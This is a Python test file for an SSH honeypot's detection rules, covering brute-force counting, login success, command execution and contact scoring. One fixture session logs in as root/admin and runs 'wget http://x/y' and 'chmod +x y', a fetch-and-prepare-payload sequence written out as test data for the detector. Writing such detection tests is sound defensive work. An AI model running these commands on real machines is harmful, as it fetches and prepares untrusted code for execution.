"""Tests for the honeypot rules (E4-05, SCRUM-58), one per rule."""

from __future__ import annotations

from datetime import UTC, datetime

from thesis.detect.honeypot import BRUTE_FORCE_MIN_FAILURES, apply_rules, score_event
from thesis.schema.alert import Alert, HoneypotDetail


def _hp(event: str, session: str, aid: str, **kw: object) -> Alert:
    return Alert(
        alert_id=aid,
        source="honeypot",
        ts=datetime(2026, 1, 1, tzinfo=UTC),
        subject_device="hp-ssh-01",
        detail=HoneypotDetail(event=event, session_id=session, src_ip="10.77.0.30", **kw),
    )


def test_twenty_failed_logins_in_a_session_is_brute_force() -> None:
    alerts = [
        _hp("login_failed", "s1", f"f{i}", username="root", password=str(i)) for i in range(20)
    ]
    scored = apply_rules(alerts)
    assert all(scored[a.alert_id] == (0.8, "brute_force") for a in alerts)


def test_success_then_commands_are_labelled() -> None:
    alerts = [
        _hp("login_success", "s2", "ok", username="root", password="admin"),
        _hp("command", "s2", "c1", command="wget http://x/y"),
        _hp("command", "s2", "c2", command="chmod +x y"),
    ]
    scored = apply_rules(alerts)
    assert scored["ok"] == (0.9, "login_success")
    assert scored["c1"][1] == "command_execution" and scored["c2"][1] == "command_execution"


def test_few_failed_logins_are_not_brute_force() -> None:
    alerts = [_hp("login_failed", "s3", f"f{i}") for i in range(3)]
    scored = apply_rules(alerts)
    assert all(scored[a.alert_id] == (0.5, "failed_login") for a in alerts)


def test_contact_events_score_low() -> None:
    assert score_event("session_connect", 0) == (0.3, "contact")
    assert BRUTE_FORCE_MIN_FAILURES == 10
